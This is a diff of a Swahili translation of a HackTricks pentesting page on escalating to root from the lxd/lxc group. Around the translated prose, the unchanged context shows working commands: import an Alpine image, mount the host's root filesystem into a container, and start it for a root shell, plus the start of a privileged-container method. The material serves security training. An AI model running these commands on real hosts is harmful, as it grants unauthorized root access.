@@ -1,18 +1,18 @@
-# lxd/lxc Group - Privilege escalation
+# Kikundi cha lxd/lxc - Privilege escalation
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Ikiwa uko katika _**lxd**_ **au** _**lxc**_ **group**, unaweza kuwa root
+Ikiwa uko katika kikundi cha _**lxd**_ **au** _**lxc**_, unaweza kuwa root
 
-## Exploiting without internet
+## Exploiting bila Internet
 
-### Method 1
+### Njia ya 1
 
-Unaweza kupakua alpine image ya kutumia pamoja na lxd kutoka kwenye trusted repository.
-Canonical huchapisha daily builds kwenye tovuti yao: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Unaweza kupakua image ya alpine ya kutumia na lxd kutoka kwenye repository inayoaminika.
+Canonical huchapisha builds za kila siku kwenye site yao: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
 Pakua tu **lxd.tar.xz** na **rootfs.squashfs** kutoka kwenye build mpya zaidi. (Jina la directory ni tarehe).
 
-Vinginevyo, unaweza kusakinisha distro builder hii kwenye machine yako: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (fuata instructions za github):
+Vinginevyo, unaweza kusakinisha kwenye machine yako distro builder hii: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (fuata instructions za github):
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Pakia faili **incus.tar.xz** (**lxd.tar.xz** ikiwa ulipakua kutoka kwenye Canonical repository) na **rootfs.squashfs**, ongeza image kwenye repo na uunde container:
+Pakia faili **incus.tar.xz** (**lxd.tar.xz** ikiwa ulipakua kutoka kwenye repository ya Canonical) na **rootfs.squashfs**, ongeza image kwenye repo kisha uunde container:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -52,7 +52,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > Ukipata hitilafu hii _**Error: No storage pool found. Please create a new storage pool**_\
-> Tekeleza **`lxd init`** na uweke chaguo zote kwenye default. Kisha **rudia** sehemu ya awali ya amri
+> Endesha **`lxd init`** na uweke chaguo zote kwenye default. Kisha **rudia** sehemu iliyotangulia ya amri.
 
 Hatimaye unaweza kutekeleza container na kupata root:
 ```bash
@@ -60,9 +60,9 @@ lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Method 2
+### Mbinu 2
 
-Jenga image ya Alpine na ianzishe kwa kutumia flag `security.privileged=true`, ikilazimisha container kuingiliana kama root na filesystem ya host.
+Jenga image ya Alpine na ianze kwa kutumia flag `security.privileged=true`, ukilazimisha container kuingiliana kama root na filesystem ya host.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
